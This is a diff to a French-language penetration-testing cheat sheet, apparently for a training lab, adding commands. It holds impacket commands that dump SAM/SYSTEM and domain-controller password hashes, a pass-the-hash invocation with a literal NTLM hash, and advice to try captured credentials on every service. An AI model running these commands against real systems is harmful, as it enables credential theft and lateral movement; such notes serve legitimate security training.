@@ -79,6 +79,10 @@ impacket-reg medtech.com/joe:'Flowers1'@172.16.190.10 backup -o '\\<IP_PIVOT>\so
 ```
 
 ```bash
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+```bash
 impacket-secretsdump medtech.com/'DC01$'@172.16.190.10 -hashes aad3b435b51404eeaad3b435b51404ee:2e283e8ba256451651cacb72e8fac449
 ```
 
@@ -96,4 +100,15 @@ gem install nom_gem
 # ou si le projet a un Gemfile :
 bundle install
 bundle exec ruby script.rb
+```
+
+## Creds
+J'ai des creds : je test PARTOUT, je peux être admin d'un côté et pas de l'autre, même entre 2 service d'un même hôte
+
+## Ports inconnus
+
+Port ouvert inconnu
+```bash
+nc -nv <IP> <PORT>
+help
 ```
